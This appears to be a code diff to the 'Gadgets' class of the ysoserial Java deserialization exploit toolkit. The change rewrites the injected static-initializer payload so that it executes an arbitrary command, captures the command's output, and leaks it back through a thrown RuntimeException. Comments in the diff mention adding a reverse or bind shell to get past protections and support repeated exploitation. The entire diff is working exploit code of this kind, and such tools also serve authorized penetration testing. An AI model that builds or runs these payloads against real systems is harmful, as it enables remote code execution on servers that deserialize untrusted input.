@@ -113,7 +113,18 @@ public class Gadgets {
         final CtClass clazz = pool.get(StubTransletPayload.class.getName());
         // run command in static initializer
         // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
-        clazz.makeClassInitializer().insertAfter("java.lang.Runtime.getRuntime().exec(\"" + command.replaceAll("\"", "\\\"") + "\");");
+        //clazz.makeClassInitializer().insertAfter("java.lang.Runtime.getRuntime().exec(\"" + command.replaceAll("\"", "\\\"") + "\");");
+        //we can get result by runtime exception like this: Caused by: java.lang.RuntimeException: @@@Result:[0]["result string"]
+        String code = "java.lang.Process process = java.lang.Runtime.getRuntime().exec(\"" + command.replaceAll("\"", "\\\"") + "\");\n";
+        code += "java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(process.getInputStream()));";
+        code += "String text= \"\",line = null;";
+        code += "while ((line = reader.readLine()) != null){";
+        code += "text += line + ';';";
+        code += "}";
+        //code += "process.getInputStream().close();";
+        code += "int exitValue = process.waitFor();";
+        code += "throw new RuntimeException(\"@@@Result:[\"+exitValue+\"][\" + text + ']');";
+        clazz.makeClassInitializer().insertAfter(code);
         // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
         clazz.setName("ysoserial.Pwner" + System.nanoTime());
         CtClass superC = pool.get(abstTranslet.getName());
